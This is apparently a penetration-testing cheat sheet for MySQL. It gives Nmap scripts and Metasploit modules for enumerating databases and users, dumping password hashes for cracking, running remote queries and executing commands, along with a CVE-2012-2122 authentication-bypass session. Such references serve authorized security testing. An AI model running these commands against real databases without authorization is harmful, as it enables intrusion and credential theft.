# Databases

## Nmap

Module that displays available databases:

    # nmap -sV --script mysql-databases <target>

Module that displays available users:

    # nmap -sV --script mysql-users <target>

Module that displays available variables:

    # nmap -sV --script mysql-variables <target>

Module that displays available users and their hash values in the form convenient for brute force attack (equivalent to 
`msf>use auxiliary/admin/mysql/mysql_hashdump`):

    # nmap -p 3306 <ip> --script mysql-dump-hashes –script args='username=root,password=secret'

Module that replaces MySQL client and sends queries to a remote database (equivalent to 
`msf>use auxiliary/admin/mysql/mysql_sql`):

    # nmap -p 3306 <ip> --script mysql-query --script-\ args='query="<query>"[,username=<username>,password=<password>]'

## Metasploit

```text
msf> use auxiliary/scanner/mysql/mysql_version
msf> use auxiliary/scanner/mysql/mysql_authbypass_hashdump
```

Requiring credentials:

```text
msf> use auxiliary/scanner/mysql/mysql_hashdump
msf> use auxiliary/admin/mysql/mysql_enum
msf> use auxiliary/scanner/mysql/mysql_schemadump
msf> use exploit/windows/mysql/mysql_start_up #Execute commands Windows, Creds
```

## CVE-2012-2122

The [CVE-2012-2122](https://www.cve.org/CVERecord?id=CVE-2012-2122) vulnerability allows remote users to bypass 
authentication due to improper checking of returned values. Only old systems are affected: Ubuntu Linux 64-bit (10.04, 
10.10, 11.04, 11.10, 12.04); OpenSuSE 12.1 64-bit MySQL 5.5.23-log; Debian Unstable 64-bit 5.5.23-2; Fedora; and Arch 
Linux. Still, worth checking for.

```text
msf > use auxiliary/scanner/mysql/mysql_authbypass_hashdump
msf auxiliary(mysql_authbypass_hashdump) > set RHOSTS 172.16.2.54
msf auxiliary(mysql_authbypass_hashdump) > set USERNAME root
msf auxiliary(mysql_authbypass_hashdump) > exploit
```

For `nmap`, during the scanning, use the script `mysql-vuln-cve2012-2122`:

    nmap -sV --script mysql-vuln-cve2012-2122 <target>

## In a hurry

    # nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <target>
